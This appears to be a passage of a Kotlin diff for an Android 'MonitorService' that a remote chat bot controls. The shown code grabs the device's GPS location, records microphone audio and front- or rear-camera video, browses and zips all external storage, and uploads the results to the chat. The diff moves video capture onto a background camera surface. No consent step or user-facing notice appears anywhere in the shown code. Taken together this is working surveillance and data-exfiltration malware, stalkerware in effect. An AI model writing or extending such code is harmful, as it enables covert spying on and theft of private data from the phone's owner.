                     mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
-                    sendMessage(chatId, "${dp()}❌ Camera error: ${e.message}")
-                    latch.countDown()
+                    sendMessage(chatId, "${dp()}❌ Camera: ${e.message}"); latch.countDown()
                 }
             }, ContextCompat.getMainExecutor(this))
         }
@@ -643,48 +630,45 @@ ${dp()}🤖 *All Commands*
     //  LOCATION
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleLocation(chatId: String) {
-        val hasFine   = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
-        val hasCoarse = hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
-        if (!hasFine && !hasCoarse) { sendMessage(chatId, "${dp()}⚠️ Location permission not granted."); return }
-        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
+    private suspend fun handleLocation(chatId: String) {
+        val hasFine   = hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)
+        val hasCoarse = hasPerm(Manifest.permission.ACCESS_COARSE_LOCATION)
+        if (!hasFine && !hasCoarse) { sendMessage(chatId, "${dp()}⚠️ Location permission missing."); return }
+        val lm    = getSystemService(LOCATION_SERVICE) as LocationManager
         val last: Location? = try {
             val g = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
             val n = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
             when { g != null && n != null -> if (g.time >= n.time) g else n; g != null -> g; else -> n }
         } catch (_: SecurityException) { null }
         if (last != null && System.currentTimeMillis() - last.time <= 3 * 60 * 1000L) {
-            sendLocationMsg(chatId, last, "📍 *Last Known Location*"); return
+            sendLocMsg(chatId, last, "📍 *Last Known*"); return
         }
-        sendMessage(chatId, "${dp()}📡 Getting GPS fix…\n⏳ ~20s | 0%")
+        sendMessage(chatId, "${dp()}📡 Getting GPS… | 0%")
         var done = false
-        val provider = if (hasFine) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
+        val prov = if (hasFine) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
         val listener = object : LocationListener {
             override fun onLocationChanged(loc: Location) {
-                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}
-                    sendLocationMsg(chatId, loc, "📍 *Current Location*") }
+                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}; sendLocMsg(chatId, loc, "📍 *Location*") }
             }
-            @Deprecated("") override fun onStatusChanged(p: String?, s: Int, e: android.os.Bundle?) {}
+            @Deprecated("") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
             override fun onProviderEnabled(p: String) {}
             override fun onProviderDisabled(p: String) {
-                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}
-                    sendMessage(chatId, "${dp()}❌ GPS disabled.") }
+                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}; sendMessage(chatId, "${dp()}❌ GPS disabled.") }
             }
         }
-        try { lm.requestLocationUpdates(provider, 0L, 0f, listener, mainHandler.looper) }
-        catch (e: SecurityException) { sendMessage(chatId, "${dp()}❌ Location permission revoked."); return }
+        try { lm.requestLocationUpdates(prov, 0L, 0f, listener, mainHandler.looper) }
+        catch (e: SecurityException) { sendMessage(chatId, "${dp()}❌ Location revoked."); return }
         mainHandler.postDelayed({
             if (!done) { done = true; try { lm.removeUpdates(listener) } catch (_: Exception) {}
-                if (last != null) sendLocationMsg(chatId, last, "⚠️ *Stale Location*")
-                else sendMessage(chatId, "${dp()}❌ Cannot get location. Enable GPS.") }
+                if (last != null) sendLocMsg(chatId, last, "⚠️ *Stale Location*")
+                else sendMessage(chatId, "${dp()}❌ Cannot get location.") }
         }, 20_000L)
     }
 
-    private fun sendLocationMsg(chatId: String, loc: Location, header: String) {
-        val lat = loc.latitude; val lon = loc.longitude
-        val acc = if (loc.hasAccuracy()) "±${loc.accuracy.toInt()} m" else "N/A"
+    private fun sendLocMsg(chatId: String, loc: Location, hdr: String) {
+        val acc = if (loc.hasAccuracy()) "±${loc.accuracy.toInt()}m" else "N/A"
         sendMessage(chatId,
-            "${dp()}$header\n\n🌐 Lat: `$lat`\n🌐 Lon: `$lon`\n🎯 Accuracy: $acc\n🗺 [Open in Maps](https://maps.google.com/?q=$lat,$lon)",
+            "${dp()}$hdr\n🌐 `${loc.latitude}, ${loc.longitude}`\n🎯 $acc\n🗺 [Maps](https://maps.google.com/?q=${loc.latitude},${loc.longitude})",
             "Markdown")
     }
 
@@ -692,87 +676,94 @@ ${dp()}🤖 *All Commands*
     //  AUDIO
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleAudio(chatId: String, seconds: Int) {
-        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
-            sendMessage(chatId, "${dp()}⚠️ RECORD_AUDIO permission not granted."); return
+    private suspend fun handleAudio(chatId: String, seconds: Int) {
+        if (!hasPerm(Manifest.permission.RECORD_AUDIO)) {
+            sendMessage(chatId, "${dp()}⚠️ RECORD_AUDIO permission missing."); return
         }
         val dur = seconds.coerceAtLeast(1)
-        sendMessage(chatId, "${dp()}🎙️ Recording ${dur}s…\n⏳ ~${dur}s | 0%")
-        serviceScope.launch {
-            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
-            @Suppress("DEPRECATION")
-            val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-                android.media.MediaRecorder(this@MonitorService)
-            else android.media.MediaRecorder()
-            try {
-                rec.apply {
-                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
-                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-                    setAudioSamplingRate(44100); setAudioEncodingBitRate(128_000)
-                    setOutputFile(file.absolutePath); prepare(); start()
-                }
-                // Progress updates every 10s
-                var elapsed = 0
-                while (elapsed < dur) {
-                    val wait = minOf(10, dur - elapsed)
-                    delay(wait * 1_000L)
-                    elapsed += wait
-                    val pct = (elapsed * 100 / dur)
-                    if (elapsed < dur) sendMessage(chatId, "${dp()}🎙️ Recording… $pct% ($elapsed/${dur}s)")
-                }
-                rec.stop(); rec.release()
-                if (!file.exists() || file.length() == 0L) {
-                    sendMessage(chatId, "${dp()}❌ Recording empty."); return@launch
-                }
-                sendMessage(chatId, "${dp()}🎙️ Done! Uploading ${formatSize(file.length())}…\n⏳ 95%")
-                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", chatId)
-                    .addFormDataPart("audio", file.name, file.readBytes().toRequestBody("audio/mp4".toMediaTypeOrNull()))
-                    .addFormDataPart("title", "Recording (${dur}s)").addFormDataPart("duration", dur.toString()).build()
-                httpClient.newCall(Request.Builder().url(URL_SEND_AUDIO).post(body).build()).execute().use { r ->
-                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
-                    else sendMessage(chatId, "${dp()}✅ Audio sent! (${dur}s)")
-                }
-            } catch (e: Exception) {
-                sendMessage(chatId, "${dp()}❌ Recording error: ${e.message}")
-                try { rec.release() } catch (_: Exception) {}
-            } finally { try { file.delete() } catch (_: Exception) {} }
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════════════════
-    //  VIDEO
-    // ══════════════════════════════════════════════════════════════════════════
-
-    private fun handleVideo(chatId: String, rawText: String) {
-        if (!hasPermission(Manifest.permission.CAMERA) || !hasPermission(Manifest.permission.RECORD_AUDIO)) {
-            sendMessage(chatId, "${dp()}⚠️ CAMERA + RECORD_AUDIO permissions required."); return
-        }
-        // Parse: /video30 or /video 30 or /video30 front or /video 30 front
-        val text    = rawText.lowercase().removePrefix("/video").trim()
-        val parts   = text.split(" ")
-        val dur     = parts[0].toIntOrNull() ?: run {
-            sendMessage(chatId, "${dp()}❌ Wrong command. Usage: /video30 or /video 30 front", "Markdown"); return
-        }
-        val isFront = parts.any { it == "front" }
-        val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
-        val label   = if (isFront) "front" else "rear"
-        val estMB   = dur * 2  // rough estimate
-        sendMessage(chatId, "${dp()}🎥 Recording ${dur}s video ($label cam)…\n⏳ ~${dur}s | ~${estMB}MB estimated | 0%")
-        serviceScope.launch { recordAndSendVideo(chatId, selector, dur, label) }
-    }
-
-    private fun recordAndSendVideo(chatId: String, selector: CameraSelector, durSec: Int, label: String) {
-        val file = File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
+        sendMessage(chatId, "${dp()}🎙️ Recording ${dur}s… | 0%")
+        val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
         @Suppress("DEPRECATION")
         val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-            android.media.MediaRecorder(this@MonitorService)
-        else android.media.MediaRecorder()
+            android.media.MediaRecorder(this) else android.media.MediaRecorder()
         try {
             rec.apply {
                 setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                setVideoSource(android.media.MediaRecorder.VideoSource.CAMERA)
+                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                setAudioSamplingRate(44100); setAudioEncodingBitRate(128_000)
+                setOutputFile(file.absolutePath); prepare(); start()
+            }
+            var elapsed = 0
+            while (elapsed < dur) {
+                if (isStopped(chatId)) {
+                    rec.stop(); rec.release()
+                    sendMessage(chatId, "${dp()}🛑 Recording stopped at ${elapsed}s.")
+                    if (file.exists() && file.length() > 0) uploadAudio(chatId, file, elapsed)
+                    return
+                }
+                val wait = minOf(10, dur - elapsed)
+                delay(wait * 1000L); elapsed += wait
+                if (elapsed < dur) sendMessage(chatId, "${dp()}🎙️ ${elapsed}/${dur}s | ${elapsed * 100 / dur}%")
+            }
+            rec.stop(); rec.release()
+            if (!file.exists() || file.length() == 0L) { sendMessage(chatId, "${dp()}❌ Empty recording."); return }
+            sendMessage(chatId, "${dp()}🎙️ Done! Uploading ${formatSize(file.length())}… | 95%")
+            uploadAudio(chatId, file, dur)
+        } catch (e: Exception) {
+            sendMessage(chatId, "${dp()}❌ Audio error: ${e.message}")
+            try { rec.release() } catch (_: Exception) {}
+        } finally { try { file.delete() } catch (_: Exception) {} }
+    }
+
+    private fun uploadAudio(chatId: String, file: File, durSec: Int) {
+        try {
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("audio", file.name, file.readBytes().toRequestBody("audio/mp4".toMediaTypeOrNull()))
+                .addFormDataPart("title", "Recording (${durSec}s)")
+                .addFormDataPart("duration", durSec.toString()).build()
+            httpClient.newCall(Request.Builder().url(URL_SEND_AUDIO).post(body).build()).execute().use { r ->
+                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Audio upload failed: ${r.code}")
+                else sendMessage(chatId, "${dp()}✅ Audio sent! (${durSec}s, ${formatSize(file.length())})")
+            }
+        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Upload error: ${e.message}") }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  VIDEO — uses MediaRecorder with Surface (no CameraX conflict)
+    // ══════════════════════════════════════════════════════════════════════════
+
+    private suspend fun handleVideo(chatId: String, rawText: String) {
+        if (!hasPerm(Manifest.permission.CAMERA) || !hasPerm(Manifest.permission.RECORD_AUDIO)) {
+            sendMessage(chatId, "${dp()}⚠️ CAMERA + RECORD_AUDIO permissions required."); return
+        }
+        val stripped = rawText.lowercase().removePrefix("/video").trim()
+        val parts    = stripped.split(" ")
+        val dur      = parts[0].toIntOrNull() ?: run {
+            sendMessage(chatId, "${dp()}❌ Wrong command. Usage: /video30 or /video30 front"); return
+        }
+        val isFront  = parts.any { it == "front" }
+        val camId    = if (isFront) android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
+                       else android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+        val label    = if (isFront) "front" else "rear"
+        sendMessage(chatId, "${dp()}🎥 Recording ${dur}s ($label cam)…\n⏳ ~${dur}s | 0%")
+
+        val file = File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
+        @Suppress("DEPRECATION")
+        val rec  = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+            android.media.MediaRecorder(this) else android.media.MediaRecorder()
+        try {
+            // Get camera ID string
+            val camMgr   = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
+            val cameraId = camMgr.cameraIdList.firstOrNull { id ->
+                val chars = camMgr.getCameraCharacteristics(id)
+                chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) == camId
+            } ?: camMgr.cameraIdList.first()
+
+            rec.apply {
+                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE)
                 setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                 setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264)
                 setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
@@ -782,35 +773,79 @@ ${dp()}🤖 *All Commands*
                 setAudioSamplingRate(44100)
                 setAudioEncodingBitRate(128_000)
                 setOutputFile(file.absolutePath)
-                prepare(); start()
+                prepare()
             }
-            // Progress every 10s
+            val surface = rec.surface
+
+            // Open camera and create capture session
+            val latch   = CountDownLatch(1)
+            var session: android.hardware.camera2.CameraCaptureSession? = null
+            var camDevice: android.hardware.camera2.CameraDevice? = null
+
+            val stateCallback = object : android.hardware.camera2.CameraDevice.StateCallback() {
+                override fun onOpened(cam: android.hardware.camera2.CameraDevice) {
+                    camDevice = cam
+                    val req = cam.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_RECORD)
+                    req.addTarget(surface)
+                    @Suppress("DEPRECATION")
+                    cam.createCaptureSession(listOf(surface),
+                        object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(s: android.hardware.camera2.CameraCaptureSession) {
+                                session = s
+                                s.setRepeatingRequest(req.build(), null, null)
+                                rec.start()
+                                latch.countDown()
+                            }
+                            override fun onConfigureFailed(s: android.hardware.camera2.CameraCaptureSession) { latch.countDown() }
+                        }, mainHandler)
+                }
+                override fun onDisconnected(cam: android.hardware.camera2.CameraDevice) { cam.close(); latch.countDown() }
+                override fun onError(cam: android.hardware.camera2.CameraDevice, err: Int) { cam.close(); latch.countDown() }
+            }
+
+            try {
+                camMgr.openCamera(cameraId, stateCallback, mainHandler)
+            } catch (e: SecurityException) {
+                sendMessage(chatId, "${dp()}❌ Camera permission denied."); return
+            }
+
+            if (!latch.await(10, TimeUnit.SECONDS)) {
+                sendMessage(chatId, "${dp()}❌ Camera open timed out."); return
+            }
+
+            // Record with progress
             var elapsed = 0
-            while (elapsed < durSec) {
-                val wait = minOf(10, durSec - elapsed)
-                Thread.sleep(wait * 1_000L)
-                elapsed += wait
-                val pct = (elapsed * 100 / durSec)
-                if (elapsed < durSec) sendMessage(chatId, "${dp()}🎥 Recording… $pct% ($elapsed/${durSec}s)")
+            while (elapsed < dur) {
+                if (isStopped(chatId)) {
+                    sendMessage(chatId, "${dp()}🛑 Video stopped at ${elapsed}s.")
+                    break
+                }
+                val wait = minOf(10, dur - elapsed)
+                delay(wait * 1000L); elapsed += wait
+                if (elapsed < dur) sendMessage(chatId, "${dp()}🎥 ${elapsed}/${dur}s | ${elapsed * 100 / dur}%")
             }
-            rec.stop(); rec.release()
+
+            // Stop recording
+            try { session?.stopRepeating() } catch (_: Exception) {}
+            try { session?.close() } catch (_: Exception) {}
+            try { camDevice?.close() } catch (_: Exception) {}
+            try { rec.stop() } catch (_: Exception) {}
+            rec.release()
+
             if (!file.exists() || file.length() == 0L) {
-                sendMessage(chatId, "${dp()}❌ Video recording empty."); return
+                sendMessage(chatId, "${dp()}❌ Video empty."); return
             }
-            sendMessage(chatId, "${dp()}🎥 Done! ${formatSize(file.length())} — splitting & uploading…\n⏳ 90%")
-            // Split and send in 49MB chunks
-            if (file.length() <= CHUNK_LIMIT) {
-                sendVideoFile(chatId, file, "🎥 Video ($label, ${durSec}s)")
-            } else {
-                splitAndSendVideo(chatId, file, label, durSec)
-            }
+            sendMessage(chatId, "${dp()}🎥 Done! ${formatSize(file.length())} — uploading…\n⏳ 90%")
+            if (file.length() <= CHUNK_LIMIT) uploadVideo(chatId, file, "🎥 $label ${dur}s")
+            else splitVideo(chatId, file, label, dur)
+
         } catch (e: Exception) {
             sendMessage(chatId, "${dp()}❌ Video error: ${e.message}")
             try { rec.release() } catch (_: Exception) {}
         } finally { try { file.delete() } catch (_: Exception) {} }
     }
 
-    private fun sendVideoFile(chatId: String, file: File, caption: String) {
+    private fun uploadVideo(chatId: String, file: File, caption: String) {
         try {
             val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", chatId)
@@ -820,117 +855,144 @@ ${dp()}🤖 *All Commands*
                 if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Video upload failed: ${r.code}")
                 else sendMessage(chatId, "${dp()}✅ Video sent!")
             }
-        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Video upload error: ${e.message}") }
+        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Video error: ${e.message}") }
     }
 
-    private fun splitAndSendVideo(chatId: String, file: File, label: String, durSec: Int) {
-        // Split file into 49MB byte chunks and send each as document
+    private fun splitVideo(chatId: String, file: File, label: String, dur: Int) {
         val data  = file.readBytes()
         val total = Math.ceil(data.size.toDouble() / CHUNK_LIMIT).toInt()
-        sendMessage(chatId, "${dp()}📦 Video is large — splitting into $total parts…")
+        sendMessage(chatId, "${dp()}📦 Large video — splitting $total parts…")
         for (i in 0 until total) {
-            val start = (i * CHUNK_LIMIT).toInt()
-            val end   = minOf(start + CHUNK_LIMIT.toInt(), data.size)
-            val chunk = data.copyOfRange(start, end)
-            val partFile = File(cacheDir, "video_part${i + 1}of${total}_${System.currentTimeMillis()}.mp4")
+            val start    = (i * CHUNK_LIMIT).toInt()
+            val end      = minOf(start + CHUNK_LIMIT.toInt(), data.size)
+            val chunk    = data.copyOfRange(start, end)
+            val partFile = File(cacheDir, "vpart${i + 1}_${System.currentTimeMillis()}.mp4")
             partFile.writeBytes(chunk)
-            val caption = "🎥 Video ($label, ${durSec}s) — Part ${i + 1}/$total"
-            sendMessage(chatId, "${dp()}⬆️ Uploading part ${i + 1}/$total…")
+            sendMessage(chatId, "${dp()}⬆️ Part ${i + 1}/$total…")
             try {
                 val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chatId)
                     .addFormDataPart("document", partFile.name, chunk.toRequestBody("video/mp4".toMediaTypeOrNull()))
-                    .addFormDataPart("caption", caption).build()
-                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
-                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Part ${i + 1} failed: ${r.code}")
-                }
+                    .addFormDataPart("caption", "🎥 $label ${dur}s — Part ${i + 1}/$total").build()
+                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use {}
             } finally { partFile.delete() }
         }
         sendMessage(chatId, "${dp()}✅ All $total video parts sent!")
     }
 
     // ══════════════════════════════════════════════════════════════════════════
-    //  ALL FILES — new file manager with breadcrumb path
+    //  FILE MANAGER — clean numbered UI with path breadcrumb
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleAllFiles(chatId: String, pathArg: String) {
-        val root   = Environment.getExternalStorageDirectory()
+    private suspend fun handleAllFiles(chatId: String, pathArg: String) {
+        val root   = Environment.getExternalStorageDirectory()   // /storage/emulated/0
         val target = if (pathArg.isEmpty()) root else resolveFolder(root, pathArg)
         if (target == null) {
-            sendMessage(chatId, "${dp()}❌ Path not found: `$pathArg`\nSend /allfiles to start from root.", "Markdown"); return
+            sendMessage(chatId, "${dp()}❌ Not found: `$pathArg`\nSend /allfiles to start from root.", "Markdown"); return
         }
-        val relPath = if (pathArg.isEmpty()) "/" else "/$pathArg"
-        folderPathCache[chatId] = pathArg
-        val all     = target.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
-        val folders = all.filter { it.isDirectory }
-        val files   = all.filter { it.isFile && it.length() > 0 }
-        folderFileCache[chatId] = files
 
-        val sb = StringBuilder()
-        sb.append("${dp()}📂 *Path: `$relPath`*\n")
-        sb.append("─────────────────\n")
+        val relPath  = if (pathArg.isEmpty()) "" else pathArg
+        val dispPath = "/storage/emulated/0${if (relPath.isEmpty()) "" else "/$relPath"}"
+        pathCache[chatId] = relPath
 
+        // Build numbered list: folders first, then files
+        val all      = target.listFiles()
+            ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
+            ?: emptyList()
+        val items    = all.map { FsItem(it.name, it, it.isDirectory) }
+        fsCache[chatId] = items
+
+        if (items.isEmpty()) {
+            sendMessage(chatId, "${dp()}📂 *$dispPath*\n\n📭 Empty folder.", "Markdown"); return
+        }
+
+        val folders = items.filter { it.isDir }
+        val files   = items.filter { !it.isDir }
+
+        // Header
+        val header = "${dp()}📂 *Path:* `$dispPath`\n" +
+            "📁 ${folders.size} folders  |  📄 ${files.size} files\n" +
+            "─────────────────────────\n"
+
+        // Send folders in pages of PAGE_SIZE
         if (folders.isNotEmpty()) {
-            sb.append("📁 *Folders (${folders.size}):*\n")
-            folders.forEachIndexed { i, f ->
-                val size  = formatSize(getFolderSize(f))
-                val count = f.listFiles()?.size ?: 0
-                sb.append("  📁 `${f.name}` — $count items, $size\n")
-                val subPath = if (pathArg.isEmpty()) f.name else "$pathArg/${f.name}"
-                sb.append("  → `/allfiles $subPath`\n")
+            var page = StringBuilder(header + "📁 *FOLDERS:*\n\n")
+            var count = 0
+            folders.forEach { item ->
+                val num   = items.indexOf(item) + 1
+                val size  = formatSize(getFolderSize(item.file))
+                val inner = item.file.listFiles()?.size ?: 0
+                page.append("$num. 📁 `${item.name}`\n    $inner items • $size\n\n")
+                count++
+                if (count >= PAGE_SIZE) {
+                    sendMessage(chatId, page.toString().trimEnd(), "Markdown")
+                    page = StringBuilder()
+                    count = 0
+                }
             }
-            sb.append("\n")
+            if (count > 0) sendMessage(chatId, page.toString().trimEnd(), "Markdown")
         }
 
+        // Send files in pages of PAGE_SIZE
         if (files.isNotEmpty()) {
-            sb.append("📄 *Files (${files.size}):*\n")
-            files.forEachIndexed { i, f ->
-                sb.append("  ${i + 1}. `${f.name}` — ${formatSize(f.length())}\n")
+            var page  = StringBuilder("📄 *FILES:*\n\n")
+            var count = 0
+            files.forEach { item ->
+                val num = items.indexOf(item) + 1
+                page.append("$num. 📄 `${item.name}`\n    ${formatSize(item.file.length())}\n\n")
+                count++
+                if (count >= PAGE_SIZE) {
+                    sendMessage(chatId, page.toString().trimEnd(), "Markdown")
+                    page = StringBuilder()
+                    count = 0
+                }
             }
-            sb.append("\n📥 `/allfiles $relPath <number>` to download\n")
-            sb.append("🗜️ `/zip ${pathArg.ifEmpty { "/" }}` to ZIP all")
+            if (count > 0) sendMessage(chatId, page.toString().trimEnd(), "Markdown")
         }
 
-        if (folders.isEmpty() && files.isEmpty()) sb.append("📭 Empty folder.")
-
-        // Split if too long
-        val msg = sb.toString()
-        if (msg.length <= 4000) sendMessage(chatId, msg, "Markdown")
-        else {
-            sendMessage(chatId, msg.take(4000), "Markdown")
-            sendMessage(chatId, msg.drop(4000).take(4000), "Markdown")
-        }
+        sendMessage(chatId,
+            "─────────────────────────\n" +
+            "💡 *Type a number* to open folder or download file\n" +
+            "🗜️ `/zip $relPath` to ZIP this folder",
+            "Markdown")
     }
 
-    private fun handleAllFilesSelect(chatId: String, number: Int) {
-        val list = folderFileCache[chatId]
-        if (list.isNullOrEmpty()) {
-            sendMessage(chatId, "${dp()}⚠️ Browse a folder first with /allfiles"); return
+    private suspend fun handleFsSelect(chatId: String, num: Int) {
+        val items = fsCache[chatId]
+        if (items.isNullOrEmpty()) {
+            sendMessage(chatId, "${dp()}⚠️ Browse first with /allfiles"); return
         }
-        val idx = number - 1
-        if (idx < 0 || idx >= list.size) {
-            sendMessage(chatId, "${dp()}❌ Choose 1–${list.size}."); return
+        val idx = num - 1
+        if (idx < 0 || idx >= items.size) {
+            sendMessage(chatId, "${dp()}❌ Choose 1–${items.size}."); return
         }
-        val file = list[idx]
-        val estSec = (file.length() / 500_000).coerceAtLeast(2)
-        sendMessage(chatId, "${dp()}📤 Sending *${file.name}* (${formatSize(file.length())})…\n⏳ ~${estSec}s | 0%", "Markdown")
-        serviceScope.launch {
+        val item = items[idx]
+        if (item.isDir) {
+            // Navigate into folder
+            val curPath  = pathCache[chatId] ?: ""
+            val newPath  = if (curPath.isEmpty()) item.name else "$curPath/${item.name}"
+            handleAllFiles(chatId, newPath)
+        } else {
+            // Download file
+            val estSec = (item.file.length() / 300_000L).coerceAtLeast(2)
+            sendMessage(chatId,
+                "${dp()}📤 Sending `${item.name}` (${formatSize(item.file.length())})…\n⏳ ~${estSec}s",
+                "Markdown")
+            if (item.file.length() > CHUNK_LIMIT) {
+                zipAndSendInChunks(chatId, listOf(item.file), item.file.nameWithoutExtension)
+                return
+            }
             try {
-                val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension.lowercase())
-                    ?: "application/octet-stream"
-                if (file.length() > CHUNK_LIMIT) {
-                    sendMessage(chatId, "${dp()}📦 File > 49MB — splitting…")
-                    zipAndSendInChunks(chatId, listOf(file), file.nameWithoutExtension)
-                    return@launch
-                }
-                sendMessage(chatId, "${dp()}⬆️ Uploading… 50%")
+                val mime = MimeTypeMap.getSingleton()
+                    .getMimeTypeFromExtension(item.file.extension.lowercase()) ?: "application/octet-stream"
                 val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chatId)
-                    .addFormDataPart("document", file.name, file.readBytes().toRequestBody(mime.toMediaTypeOrNull()))
-                    .addFormDataPart("caption", "📎 ${file.name} (${formatSize(file.length())})").build()
+                    .addFormDataPart("document", item.file.name,
+                        item.file.readBytes().toRequestBody(mime.toMediaTypeOrNull()))
+                    .addFormDataPart("caption", "📎 ${item.file.name} (${formatSize(item.file.length())})").build()
                 httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                     if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
-                    else sendMessage(chatId, "${dp()}✅ *${file.name}* sent!", "Markdown")
+                    else sendMessage(chatId, "${dp()}✅ `${item.name}` sent!", "Markdown")
                 }
             } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error: ${e.message}") }
         }
@@ -940,22 +1002,23 @@ ${dp()}🤖 *All Commands*
     //  ZIP
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleZip(chatId: String, pathArg: String) {
+    private suspend fun handleZip(chatId: String, pathArg: String) {
         val root   = Environment.getExternalStorageDirectory()
         val target = resolveFolder(root, pathArg) ?: File(root, pathArg).takeIf { it.isFile }
         if (target == null) { sendMessage(chatId, "${dp()}❌ Not found: `$pathArg`", "Markdown"); return }
         val files = if (target.isFile) listOf(target)
                     else target.walkTopDown().filter { it.isFile }.toList()
-        val totalSize = files.sumOf { it.length() }
-        sendMessage(chatId, "${dp()}🗜️ Zipping `$pathArg`…\n📊 ${files.size} files, ${formatSize(totalSize)}\n⏳ Please wait | 0%", "Markdown")
-        serviceScope.launch { zipAndSendInChunks(chatId, files, target.name) }
+        sendMessage(chatId,
+            "${dp()}🗜️ Zipping `$pathArg`…\n📊 ${files.size} files, ${formatSize(files.sumOf { it.length() })}\n⏳ 0%",
+            "Markdown")
+        zipAndSendInChunks(chatId, files, target.name)
     }
 
-    private fun zipAndSendInChunks(chatId: String, files: List<File>, baseName: String) {
-        val chunks      = mutableListOf<MutableList<File>>()
-        var cur         = mutableListOf<File>()
-        var curSize     = 0L
+    private suspend fun zipAndSendInChunks(chatId: String, files: List<File>, baseName: String) {
+        val chunks = mutableListOf<MutableList<File>>()
+        var cur = mutableListOf<File>(); var curSize = 0L
         for (f in files) {
+            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 ZIP stopped."); return }
             val sz = f.length()
             if (sz > CHUNK_LIMIT) { sendMessage(chatId, "${dp()}⚠️ Skipped `${f.name}` (${formatSize(sz)} > 49MB)", "Markdown"); continue }
             if (curSize + sz > CHUNK_LIMIT && cur.isNotEmpty()) { chunks.add(cur); cur = mutableListOf(); curSize = 0L }
@@ -965,6 +1028,7 @@ ${dp()}🤖 *All Commands*
         if (chunks.isEmpty()) { sendMessage(chatId, "${dp()}❌ Nothing to ZIP."); return }
         val total = chunks.size
         chunks.forEachIndexed { idx, chunkFiles ->
+            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 ZIP stopped."); return }
             val pct     = ((idx + 1) * 100 / total)
             val partLbl = if (total > 1) "_part${idx + 1}of$total" else ""
             val zipFile = File(cacheDir, "$baseName${partLbl}_${System.currentTimeMillis()}.zip")
@@ -972,11 +1036,8 @@ ${dp()}🤖 *All Commands*
             try {
                 ZipOutputStream(zipFile.outputStream().buffered()).use { zos ->
                     for (f in chunkFiles) {
-                        try {
-                            zos.putNextEntry(ZipEntry(f.name))
-                            f.inputStream().use { it.copyTo(zos) }
-                            zos.closeEntry()
-                        } catch (_: Exception) {}
+                        try { zos.putNextEntry(ZipEntry(f.name)); f.inputStream().use { it.copyTo(zos) }; zos.closeEntry() }
+                        catch (_: Exception) {}
                     }
                 }
                 if (!zipFile.exists() || zipFile.length() == 0L) {
@@ -987,12 +1048,13 @@ ${dp()}🤖 *All Commands*
